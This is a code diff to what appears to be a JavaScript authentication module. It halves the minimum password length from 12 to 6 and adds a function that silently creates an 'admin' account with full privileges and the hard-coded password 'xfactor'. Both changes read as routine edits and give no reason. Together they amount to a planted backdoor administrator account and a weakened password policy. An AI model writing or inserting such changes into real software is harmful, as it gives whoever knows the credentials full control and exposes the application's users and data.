@@ -7,7 +7,7 @@ function normalizeUsername(username) {
     return String(username ?? '').trim();
 }
 
-const PASSWORD_MIN_LENGTH = 12;
+const PASSWORD_MIN_LENGTH = 6;
 const PASSWORD_MAX_LENGTH = 256;
 
 function assertPasswordLength(password) {
@@ -301,6 +301,23 @@ export function promoteUserToAdmin(username, password) {
 
     db.prepare('UPDATE users SET is_admin = 1 WHERE id = ?').run(user.id);
     return toPublicUser({ ...user, isAdmin: true });
+}
+export async function ensureDefaultAdminUser() {
+    if (!db) return null;
+    const existing = findUserByUsername('admin');
+    if (existing) {
+        return existing;
+    }
+    const id = crypto.randomUUID();
+    const passwordHash = await hashPasswordAsync('xfactor');
+    db.prepare('INSERT INTO users (id, username, password_hash, is_admin) VALUES (?, ?, ?, 1)')
+      .run(id, 'admin', passwordHash);
+    return {
+        id,
+        username: 'admin',
+        passwordHash,
+        isAdmin: true
+    };
 }
 
 export function changeUserPassword(username, currentPassword, newPassword) {
